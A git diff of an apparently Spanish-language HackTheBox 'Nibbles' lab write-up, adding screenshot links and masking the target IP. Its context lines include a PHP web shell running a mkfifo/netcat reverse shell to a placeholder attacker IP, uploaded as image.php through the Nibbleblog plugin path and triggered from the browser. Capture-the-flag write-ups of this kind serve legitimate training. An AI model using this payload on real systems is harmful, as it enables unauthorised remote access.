@@ -153,13 +153,25 @@ Progress: 4059 / 4615 (87.95%)
 2022/07/20 19:17:45 Finished
 ===============================================================
 ~~~
-![]()
+![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/1.png)
 
-![]()
+![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/2.png)
+
+![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/3.png)
+
+![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/4.png)
+
+![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/5.png)
+
+![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/6.png)
+
+![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/7.png)
+
+
 
 creamos un archivo con el codigo `<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc NUESTRA-IP 9443 >/tmp/f"); ?>` y lo guardamos como image.php
 
->en firefox http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php para activar el reverse shell
+>en firefox http://DIRECCION-IP/nibbleblog/content/private/plugins/my_image/image.php para activar el reverse shell
 
 ~~~
 ┌──(root㉿kali)-[/home/kali]
